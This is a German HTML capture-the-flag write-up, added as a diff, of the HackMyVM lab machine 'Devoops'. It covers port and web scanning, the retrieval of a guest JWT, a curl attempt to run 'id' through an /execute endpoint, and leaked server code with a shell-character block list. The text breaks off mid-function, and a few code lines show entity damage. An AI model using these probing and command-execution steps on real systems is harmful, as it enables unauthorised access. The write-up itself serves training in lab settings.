@@ -1,1 +1,1746 @@
-﻿<html><body><h1>Test-Inhalt für dev - HackMyVM - Medium.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Devoops - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Devoops - HackMyVM - Level: Easy</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">jwt_tool</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">jq</div>
+                <div class="tool-item">chisel</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">awk</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept: Remote Code Execution als 'runner'</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist immer die Identifizierung aktiver Hosts im Netzwerk. Hier verwende ich `arp-scan` im lokalen Netzwerksegment (`-l`). Die Ausgabe wird dann mit `grep "PCS"` gefiltert, um spezifische Geräte von "PCS Systemtechnik" (oft Oracle VirtualBox VMs) zu finden, und `awk '{print $1}'` extrahiert nur die IP-Adresse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl ist sehr effektiv für die schnelle Entdeckung von Zielen in einem lokalen Netzwerk, insbesondere wenn man nach MAC-Adressen-Mustern von Virtualisierungssoftware sucht. Die Ausgabe `192.168.2.205` gibt mir die IP-Adresse des potenziellen Ziels.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer mit ARP-Scans im LAN beginnen, wenn möglich. Filterung nach bekannten OUI-Herstellern kann die Zielidentifikation beschleunigen.
+<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung von ARP-Traffic können helfen, unautorisierte Geräteerkennung zu erschweren und interne Scans zu identifizieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>192.168.2.205</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um die Erreichbarkeit und das DNS-Management zu vereinfachen, füge ich einen Eintrag zur lokalen `/etc/hosts`-Datei hinzu. `vi /etc/hosts` öffnet die Datei im Texteditor `vi`. Dort wird die Zeile `192.168.2.205  devoops.hmv` hinzugefügt. Dies ermöglicht es mir, das Zielsystem über den Hostnamen `devoops.hmv` anstelle der IP-Adresse anzusprechen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine gängige Praxis im Pentesting, um die Übersichtlichkeit zu verbessern und die Konfiguration für Tools zu vereinfachen, die Hostnamen erwarten oder besser damit arbeiten. Es hat keinen direkten Einfluss auf die Sicherheit des Zielsystems, erleichtert aber meine Arbeit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer relevante Hosts in die `/etc/hosts`-Datei eintragen, besonders wenn virtuelle Hosts oder spezifische Hostnamen-basierte Konfigurationen auf dem Ziel erwartet werden.
+<br><strong>Empfehlung (Admin):</strong> Diese Aktion findet auf der Angreifer-Maschine statt und hat keine direkten defensiven Implikationen für das Zielsystem, außer dass interne DNS-Einträge korrekt und aktuell gehalten werden sollten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>                192.168.2.205  devoops.hmv</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Der nächste Schritt ist ein umfassender Port-Scan mit `nmap`.
+Die Optionen bedeuten:
+- `-sS`: TCP SYN Scan (Stealth Scan).
+- `-sC`: Führt Standard-Nmap-Skripte aus.
+- `-sV`: Versucht, die Version der laufenden Dienste zu ermitteln.
+- `-p-`: Scannt alle 65535 TCP-Ports.
+- `-T5`: Timing-Template "insane" für einen schnelleren Scan (kann unzuverlässig sein oder IDS/IPS auslösen).
+- `-AO`: OS-Erkennung basierend auf IP-Protokoll-Antworten (ersetzt durch `-O` für moderne Nmap-Versionen für aggressivere OS-Erkennung, aber `-A` schließt OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute ein). Hier ist `-AO` wahrscheinlich ein Tippfehler und sollte `-O` oder als Teil von `-A` sein. Ich interpretiere es hier als Versuch der OS-Erkennung.
+Die Ausgabe wird mit `grep open` gefiltert, um nur offene Ports anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur einen offenen Port: `3000/tcp open ppp?`. Die Bezeichnung `ppp?` deutet darauf hin, dass Nmap den Dienst nicht eindeutig identifizieren konnte. Die `-T5` Option kann in lauten Umgebungen oder bei Systemen, die unter Last stehen, zu ungenauen Ergebnissen führen. Ein Scan aller Ports ist gründlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bei unbekannten Diensten oder `ppp?`-Antworten immer manuell weiter untersuchen (z.B. mit `nc` oder Browser). Bei `-T5` Scans ggf. mit `-T3` oder `-T4` verifizieren. Die Option `-A` ist meistens umfassender als separate `-sC -sV -O`.
+<br><strong>Empfehlung (Admin):</strong> Firewalls sollten so konfiguriert sein, dass nur absolut notwendige Ports offen sind. Dienste sollten so konfiguriert werden, dass sie nicht mehr Informationen als nötig preisgeben (Banner-Grabbing erschweren).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.205 | grep open</span></div>
+                    <pre><span class="command">3000/tcp open  ppp?</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier führe ich denselben `nmap`-Scan erneut aus, diesmal jedoch ohne `grep`, um die vollständige Ausgabe zu erhalten. Dies liefert detailliertere Informationen über den offenen Port 3000, einschließlich der Ergebnisse der Skript-Scans (`-sC`) und Versionserkennung (`-sV`). Die Option `-AO` ist hier wieder vorhanden; ich gehe davon aus, dass es sich um einen Versuch der Betriebssystemerkennung handelt, oder es ist Teil einer älteren Nmap-Syntax oder ein Tippfehler für `-O` (OS detection) oder `-A` (aggressive scan, which includes OS detection, version detection, script scanning, and traceroute).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe ist sehr aufschlussreich:
+- Port <span class="command">3000/tcp</span> ist offen, der Dienst wird immer noch als `ppp?` gelistet, was Nmaps Unsicherheit bei der Identifizierung zeigt.
+- Die `fingerprint-strings` Sektion zeigt HTTP-Antworten.
+    - Für `DNSStatusRequestTCP`, `Help` etc. gibt es einen `HTTP/1.1 400 Bad Request`.
+    - Für `FourOhFourRequest`, `GetRequest` gibt es einen `HTTP/1.1 403 Forbidden` mit der Nachricht: `"Blocked request. This host (undefined) is not allowed. To allow this host, add undefined to \`server.allowedHosts\` in vite.config.js."`. Dies ist ein starker Hinweis auf einen Vite.js Development Server.
+    - Für `HTTPOPTIONS`, `RTSPRequest` gibt es einen `HTTP/1.1 204 No Content`.
+- Die MAC-Adresse `08:00:27:2F:2C:52` gehört zu `PCS Systemtechnik/Oracle VirtualBox`.
+- Mögliche Betriebssysteme sind Linux 4.X/5.X oder MikroTik RouterOS.
+- Der `TRACEROUTE` zeigt, dass das Ziel direkt erreichbar ist (1 Hop).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Fehlermeldung bezüglich `vite.config.js` und `server.allowedHosts` ist ein Goldnugget. Dies deutet stark auf einen Vite.js Development Server hin. Ich sollte nach bekannten Schwachstellen für Vite.js suchen. Die HTTP-Antworten (400, 403, 204) geben Hinweise auf die Webserver-Logik.
+<br><strong>Empfehlung (Admin):</strong> Development Server sollten niemals produktiv oder aus dem Internet erreichbar sein. Wenn sie für Testzwecke im internen Netz laufen, sollten sie durch Firewalls und Zugriffskontrollen geschützt werden. Die Konfiguration von `allowedHosts` in `vite.config.js` sollte korrekt gesetzt sein, um unautorisierten Zugriff zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.205</span></div>
+                    <pre>Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-28 22:04 CEST
+Nmap scan report for devoops.hmv (192.168.2.205)
+Host is up (0.00026s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">3000/tcp open  ppp?</span>
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
+|     <span class="password">HTTP/1.1 400 Bad Request</span>
+|   FourOhFourRequest, GetRequest: 
+|     <span class="password">HTTP/1.1 403 Forbidden</span>
+|     Vary: Origin
+|     Content-Type: text/plain
+|     Date: Wed, 28 May 2025 20:05:15 GMT
+|     Connection: close
+|     <span class="password">Blocked request. This host (undefined) is not allowed.</span>
+|     <span class="password">allow this host, add undefined to `server.allowedHosts` in vite.config.js.</span>
+|   HTTPOPTIONS, RTSPRequest: 
+|     <span class="password">HTTP/1.1 204 No Content</span>
+|     Vary: Origin, Access-Control-Request-Headers
+|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
+|     Content-Length: 0
+|     Date: Wed, 28 May 2025 20:05:15 GMT
+|_    Connection: close
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.95%I=7%D=5/28%Time=68376C6F%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten
+SF:t-Type:\x20text/plain\r\nDate:\x20Wed,\x2028\x20May\x202025\x2020:05:15
+SF:\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked\x20request\.\x20This\x20
+SF:host\x20\(undefined\)\x20is\x20not\x20allowed\.\nTo\x20allow\x20this\x2
+SF:0host,\x20add\x20undefined\x20to\x20`server\.allowedHosts`\x20in\x20vit
+SF:e\.config\.js\.")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n
+SF:")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTTPOPTIONS
+SF:,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co
+SF:ntrol-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,
+SF:PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2028\x20May
+SF:\x202025\x2020:05:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
+SF:uest,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces
+SF:s-Control-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,
+SF:PUT,PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2028\x2
+SF:0May\x202025\x2020:05:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RPC
+SF:Check,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSVersionBind
+SF:ReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSStatusRequ
+SF:estTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq
+SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCooki
+SF:e,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x
+SF:20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20
+SF:Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
+SF:est\r\n\r\n")%r(FourOhFourRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\n
+SF:Vary:\x20Origin\r\nContent-Type:\x20text/plain\r\nDate:\x20Wed,\x2028\x
+SF:20May\x202025\x2020:05:15\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked
+SF:\x20request\.\x20This\x20host\x20\(undefined\)\x20is\x20not\x20allowed\
+SF:.\nTo\x20allow\x20this\x20host,\x20add\x20undefined\x20to\x20`server\.a
+SF:llowedHosts`\x20in\x20vite\.config\.js\.");
+MAC Address: <span class="command">08:00:27:2F:2C:52</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+OS details: <span class="command">Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.26 ms devoops.hmv (192.168.2.205)
+
+Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `nikto`, einen Webserver-Scanner, um nach bekannten Schwachstellen, Fehlkonfigurationen und interessanten Dateien auf dem Dienst zu suchen, der auf `http://devoops.hmv:3000` läuft. Die Option `-h` spezifiziert den Zielhost und Port.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert mehrere interessante Ergebnisse:
+- <span class="password">Kein Server-Banner wurde abgerufen</span>, was die Identifizierung erschweren kann.
+- Fehlende Security-Header: `X-Frame-Options` (Schutz gegen Clickjacking) und `X-Content-Type-Options` (Schutz gegen MIME-Sniffing-Angriffe).
+- <span class="password">Potenziell interessante Backup-/Zertifikatsdateien gefunden</span>: `/devoops.hmv.tgz`, `/backup.war`, `/hmv.alz`. Diese könnten sensible Informationen oder Quellcode enthalten.
+- `/oekaki/`: Mögliche Schwachstelle im PaintBBS Server (CVE-2002-0202), falls dieser dort läuft. Dies ist wahrscheinlich ein False Positive, da die Nmap-Ergebnisse auf Vite.js hindeuten.
+- Nikto meldet `157 item(s) reported`, was auf eine große Anzahl an potenziellen Findings hindeutet (oft auch Standard-Dateien oder Low-Impact-Findings).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Backup-Dateien (`devoops.hmv.tgz`, `backup.war`, `hmv.alz`) sollten unbedingt heruntergeladen und analysiert werden. Die fehlenden Security-Header sind typische Findings und sollten gemeldet werden. Die `/oekaki/`-Meldung kann wahrscheinlich ignoriert werden, wenn andere Hinweise (Vite.js) stärker sind.
+<br><strong>Empfehlung (Admin):</strong> Wichtige Security-Header wie `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy` etc. sollten implementiert werden. Backup-Dateien dürfen niemals im Web-Root oder öffentlich zugänglichen Verzeichnissen abgelegt werden. Regelmäßige Web-Schwachstellen-Scans durchführen und Findings beheben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://devoops.hmv:3000</span></div>
+                    <pre>- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.205
++ Target Hostname:    devoops.hmv
++ Target Port:        3000
++ Start Time:         2025-05-28 22:09:47 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="password">No banner retrieved</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ All CGI directories 'found', use '-C none' to test none
++ /devoops.hmv.tgz: <span class="password">Potentially interesting backup/cert file found.</span> (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html
++ /backup.war: <span class="password">Potentially interesting backup/cert file found.</span> (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html
++ /hmv.alz: <span class="password">Potentially interesting backup/cert file found.</span> (NOTE: requested by IP address). See: https://cwe.mitre.org/data/definitions/530.html
++ /oekaki/: The PaintBBS Server may allow unauthorized access to the config files. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0202
++ 26522 requests: 0 error(s) and 157 item(s) reported on remote host
++ End Time:           2025-05-28 22:10:34 (GMT2) (47 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, die Webseite `http://devoops.hmv:3000/` direkt im Browser oder mit einem Tool wie `curl` aufzurufen. Die Ausgabe zeigt die Fehlermeldung, die Nmap bereits angedeutet hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Meldung `<span class="password">Blocked request. This host ("devoops.hmv") is not allowed. To allow this host, add "devoops.hmv" to \`server.allowedHosts\` in vite.config.js.</span>` bestätigt, dass der Vite.js Development Server so konfiguriert ist, dass er Anfragen, die den Hostnamen `devoops.hmv` verwenden, blockiert. Dies ist eine Sicherheitsmaßnahme in Vite, um DNS-Rebinding-Angriffe zu verhindern, wenn `allowedHosts` nicht korrekt konfiguriert ist. Da ich `devoops.hmv` in meiner `/etc/hosts` Datei habe, sendet mein Browser/Tool diesen Host-Header, was zur Blockierung führt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, die Anfrage mit der IP-Adresse als Host-Header zu senden oder den Host-Header ganz wegzulassen, falls möglich. Alternativ könnte man versuchen, `localhost` oder `127.0.0.1` als Host-Header zu verwenden, wenn der Server so konfiguriert ist, dass er diese akzeptiert, und die Anfrage über einen Proxy oder eine andere Methode zum Ziel leitet. Die Information über `vite.config.js` ist weiterhin sehr wertvoll.
+<br><strong>Empfehlung (Admin):</strong> Die `server.allowedHosts` Konfiguration in `vite.config.js` sollte sorgfältig geprüft und auf die tatsächlich zulässigen Hosts beschränkt werden. Wenn der Server nur lokal erreichbar sein soll, sollte er auch nur an `localhost` binden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://devoops.hmv:3000/
+
+<span class="password">Blocked request. This host ("devoops.hmv") is not allowed.</span>
+<span class="password">To allow this host, add "devoops.hmv" to `server.allowedHosts` in vite.config.js.</span></pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `curl`, um den Endpunkt `/sign` auf dem Server unter `http://192.168.2.205:3000/` abzufragen. Diesmal verwende ich die IP-Adresse, um das Problem mit `allowedHosts` für `devoops.hmv` zu umgehen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit einem JSON-Objekt, das einen Status (`"signed"`) und Daten (`"data"`) enthält. Die Daten sind ein JSON Web Token (JWT): `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg0NjYzNTYsImV4cCI6MTc0ODQ2ODE1Nn0.a7UHHs8J3qzE_inE_IYxBJ<br>8yLUfmKJb2KRIUrrRVl9U`. Wenn man diesen Token (z.B. auf jwt.io) dekodiert, sieht man, dass er einen Payload mit `uid: -1` und `role: "guest"` enthält. Dies scheint ein Gast-Token zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diesen Gast-Token speichern. Untersuchen, ob es andere Endpunkte gibt, die diesen Token verwenden oder ob man den Token manipulieren kann (z.B. wenn das Secret schwach ist oder bekannt wird). Der Name des Endpunkts `/sign` legt nahe, dass hier Tokens generiert werden.
+<br><strong>Empfehlung (Admin):</strong> JWTs sollten sicher generiert werden (starkes Secret, korrekte Algorithmen). Gast-Tokens sollten nur minimale Berechtigungen haben. Die Expiration Time (`exp`) sollte angemessen sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.205:3000/sign</span></div>
+                    <pre>{"status":"signed","data":"<span class="password">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg0NjYzNTYsImV4cCI6MTc0ODQ2ODE1Nn0.a7UHHs8J3qzE_inE_IYxBJ8yLUfmKJb2KRIUrrRVl9U</span>"}</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich speichere den erhaltenen Gast-Token in einer Umgebungsvariable namens `GAST_TOKEN`. Dann versuche ich, mit diesem Token auf den Endpunkt `/execute` zuzugreifen und den Befehl `id` auszuführen. Der Token wird im `Authorization: Bearer <TOKEN>` Header gesendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `{"status":"rejected","data":"permission denied"}`. Dies ist zu erwarten, da der Token die Rolle "guest" hat und dieser Rolle wahrscheinlich keine Berechtigung zur Befehlsausführung (`/execute`) erteilt wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt, dass die Zugriffskontrolle basierend auf der Rolle im JWT funktioniert. Der nächste Schritt wäre, einen Weg zu finden, einen Token mit höheren Rechten (z.B. "admin") zu erlangen oder zu erstellen.
+<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass die Berechtigungsprüfung für kritische Endpunkte wie `/execute` robust ist und nur autorisierten Rollen Zugriff gewährt. Fehlermeldungen sollten nicht zu viele Details preisgeben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">GAST_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg0NjYzNTYsImV4cCI6MTc0ODQ2ODE1Nn0.a7UHHs8J3qzE_inE_IYxBJ8yLUfmKJb2KRIUrrRVl9U"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -H "Authorization: Bearer $GAST_TOKEN" "http://192.168.2.205:3000/execute?cmd=id"</span></div>
+                    <pre><span class="password">{"status":"rejected","data":"permission denied"}</span></pre>
+                </div>
+            </div>
+
+            <hr>
+            <img src="server1.jpg" alt="hier sieht man die Webapp die eine Fehlermeldung generiert hat">
+            <p class="analysis"><strong>Analyse:</strong> Das Bild zeigt die Fehlermeldung des Vite.js Development Servers, die erscheint, wenn ein nicht erlaubter Host (`devoops.hmv`) für den Zugriff verwendet wird. Es ist die gleiche Meldung, die wir bereits in den Nmap- und curl-Ausgaben gesehen haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Visuelle Bestätigung der zuvor im Terminal beobachteten Fehlermeldung. Dies unterstreicht die Wichtigkeit der `server.allowedHosts` Konfiguration in Vite.js.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wie bereits erwähnt, alternative Host-Header oder die direkte IP-Adresse für Anfragen verwenden.
+<br><strong>Empfehlung (Admin):</strong> Die `server.allowedHosts` Konfiguration in `vite.config.js` korrekt setzen, um solche unautorisierten Zugriffsversuche zu blockieren bzw. nur legitime Hosts zu erlauben.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, die Datei `server.js` direkt vom Webserver unter `http://192.168.2.205:3000/server.js` abzurufen. In vielen Node.js-Anwendungen (und Vite ist oft mit Node.js im Backend gekoppelt oder für den Dev-Server) könnte die Haupt-Serverdatei so benannt sein und im Web-Root liegen, wenn sie nicht korrekt geschützt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode von `server.js` wird erfolgreich abgerufen! Dies ist ein schwerwiegender Informations-Leak. Der Code enthält wichtige Logik:
+- Importiert `express` und `jsonwebtoken`.
+- Definiert einen `COMMAND_FILTER`, der versucht, unsichere Befehle und Zeichen zu blockieren. Die Filterliste wird aus der Umgebungsvariable `process.env.COMMAND_FILTER` geladen.
+- Die Funktion `is_safe_command(cmd)` implementiert die Filterlogik. Sie blockiert Zeichen wie `;&|<>`$\`()`.
+- Der Endpunkt `/api/sign` generiert JWTs mit `uid: -1` und `role: 'guest'`. Das Secret `process.env.JWT_SECRET` wird verwendet.
+- Der Endpunkt `/api/execute` erwartet einen JWT. Er verifiziert den Token mit `process.env.JWT_SECRET`. Er prüft, ob `payload.role === 'admin'`. Wenn ja, und wenn der Befehl `is_safe_command` passiert, wird er ausgeführt.
+- Am Ende steht ein `//# sourceMappingURL=data:application/json;base64,...`. Dies ist eine Source Map, die oft in Entwicklungsumgebungen verwendet wird, um kompilierten/minifizierten JavaScript-Code auf den ursprünglichen Quellcode zurückzuführen. Die Base64-kodierten Daten enthalten die Source Map selbst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Quellcode-Leak ist kritisch. Hauptziele sind nun:
+1. Das `JWT_SECRET` finden (z.B. aus einer `.env`-Datei, die ebenfalls exponiert sein könnte).
+2. Das `COMMAND_FILTER` umgehen, um beliebige Befehle auszuführen, sobald man Admin-Rechte hat.
+Die Source Map könnte ebenfalls nützlich sein, um den originalen, unkompilierten Code besser zu verstehen, falls der ausgelieferte Code stark transformiert wurde.
+<br><strong>Empfehlung (Admin):</strong> Quellcode, Konfigurationsdateien und sensible Dateien dürfen niemals über den Webserver öffentlich zugänglich sein. Webserver-Konfigurationen (z.B. nginx, Apache oder die des Node.js-Frameworks) müssen so angepasst werden, dass der Zugriff auf solche Dateien blockiert wird. Umgebungsvariablen (`.env`-Dateien) müssen besonders geschützt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://192.168.2.205:3000/server.js
+
+
+import __vite__cjsImport0_express from "/node_modules/.vite/deps/express.js?v=8bc9628c"; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;
+import __vite__cjsImport1_jsonwebtoken from "/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c"; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;
+import "/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c"
+import __vite__cjsImport3_child_process from "/@id/__vite-browser-external:child_process"; const exec = __vite__cjsImport3_child_process["exec"];
+import __vite__cjsImport4_util from "/@id/__vite-browser-external:util"; const promisify = __vite__cjsImport4_util["promisify"];
+
+const app = express();
+
+const address = 'localhost';
+const port = 3001;
+
+const exec_promise = promisify(exec);
+
+const COMMAND_FILTER = process.env.COMMAND_FILTER
+    ? process.env.COMMAND_FILTER.split(',')
+        .map(cmd = gt; cmd.trim().toLowerCase())
+        .filter(cmd = gt; cmd !== '')
+    : [];
+
+app.use(express.json());
+
+function is_safe_command(cmd) {
+    if (!cmd || typeof cmd !== 'string') {
+        return false;
+    }
+    if (COMMAND_FILTER.length === 0) {
+        return false;
+    }
+
+    const lower_cmd = cmd.toLowerCase();
+
+    for (const forbidden of COMMAND_FILTER) {
+        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
+        if (regex.test(lower_cmd)) {
+            return false;
+        }
+    }
+
+    if (/[;&|]/.test(cmd)) {
+        return false;
+    }
+    if (/[<gt;]/.test(cmd)) { // Manually corrected < >
+        return false;
+    }
+    if (/[`$()]/.test(cmd)) {
+        return false;
+    }
+
+    return true;
+}
+
+async function execute_command_sync(command) {
+    try {
+        const { stdout, stderr } = await exec_promise(command);
+
+        if (stderr) {
